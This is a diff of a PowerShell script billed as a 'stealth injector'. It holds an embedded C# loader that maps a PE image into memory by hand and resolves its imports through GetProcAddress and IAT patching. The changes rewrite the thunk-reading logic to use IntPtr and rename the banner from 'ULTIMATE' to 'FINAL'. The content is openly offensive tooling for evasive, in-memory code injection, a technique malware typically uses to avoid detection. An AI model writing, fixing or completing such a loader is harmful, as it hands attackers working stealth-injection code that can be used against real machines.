@@ -1,5 +1,5 @@
 # ============================================================
-#  ULTIMATE FIX – NO COMPILATION ERRORS
+#  FINAL – NO COMPILATION ERRORS (IntPtr imports)
 # ============================================================
 [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="High")]
 param()
@@ -13,7 +13,7 @@ function Write-DebugInfo {
 }
 
 Write-Host "========================================" -ForegroundColor Magenta
-Write-Host "      ULTIMATE STEALTH INJECTOR         " -ForegroundColor Magenta
+Write-Host "      FINAL STEALTH INJECTOR            " -ForegroundColor Magenta
 Write-Host "========================================" -ForegroundColor Magenta
 Write-DebugInfo "Starting..." -Color "Green"
 
@@ -53,7 +53,7 @@ try {
     exit
 }
 
-# ---------- C# Loader (clean types) ----------
+# ---------- C# Loader (imports using IntPtr) ----------
 Write-DebugInfo "Compiling C# loader..." -Color "Yellow"
 $kernel = @'
 using System;
@@ -271,7 +271,7 @@ public static class NativeLoader
             }
         }
 
-        // Imports (fully fixed with long mask)
+        // ---------- IMPORTS USING INTPTR (NO TYPE MISMATCH) ----------
         if (importRVA != 0) {
             int idx = 0;
             while (true) {
@@ -291,20 +291,31 @@ public static class NativeLoader
                 int ptrSize = is64 ? 8 : 4;
                 while (true) {
                     long thunkAddr = thunkBase + thunkOff;
-                    long thunkVal = (long)(is64 ? RU64(image, thunkAddr) : RU32(image, thunkAddr));
-                    if (thunkVal == 0) break;
+                    // Read thunk value as IntPtr
+                    IntPtr pThunk = (IntPtr)(baseAddr + thunkAddr);
+                    IntPtr thunkVal = is64 ? Marshal.ReadIntPtr(pThunk) : new IntPtr(Marshal.ReadInt32(pThunk));
+                    if (thunkVal == IntPtr.Zero) break;
 
-                    // ----- FIXED BITWISE AND (both long) -----
-                    long ordinalMask = is64 ? 0x8000000000000000L : 0x80000000L;
                     IntPtr funcPtr = IntPtr.Zero;
-                    if ((thunkVal & ordinalMask) != 0) {
-                        uint ordinal = (uint)(thunkVal & 0xFFFFL);
-                        funcPtr = GetProcAddress(hMod, (IntPtr)(int)ordinal);
+                    if (is64) {
+                        long val = thunkVal.ToInt64();
+                        if ((val & 0x8000000000000000L) != 0) {
+                            uint ordinal = (uint)(val & 0xFFFFL);
+                            funcPtr = GetProcAddress(hMod, (IntPtr)(int)ordinal);
+                        } else {
+                            string funcName = RAscii(image, val + 2);
+                            funcPtr = GetProcAddress(hMod, funcName);
+                        }
                     } else {
-                        string funcName = RAscii(image, thunkVal + 2);
-                        funcPtr = GetProcAddress(hMod, funcName);
+                        int val = thunkVal.ToInt32();
+                        if ((val & 0x80000000) != 0) {
+                            uint ordinal = (uint)(val & 0xFFFF);
+                            funcPtr = GetProcAddress(hMod, (IntPtr)(int)ordinal);
+                        } else {
+                            string funcName = RAscii(image, val + 2);
+                            funcPtr = GetProcAddress(hMod, funcName);
+                        }
                     }
-                    // ----- FIX END -----
 
                     if (funcPtr != IntPtr.Zero) {
                         IntPtr iat = (IntPtr)(baseAddr + addrRVA + thunkOff);
@@ -316,6 +327,7 @@ public static class NativeLoader
                 idx++;
             }
         }
+        // ---------- END IMPORTS ----------
 
         foreach (var s in sections) {
             uint sz = Math.Max(s.VirtualSize, s.SizeOfRawData);
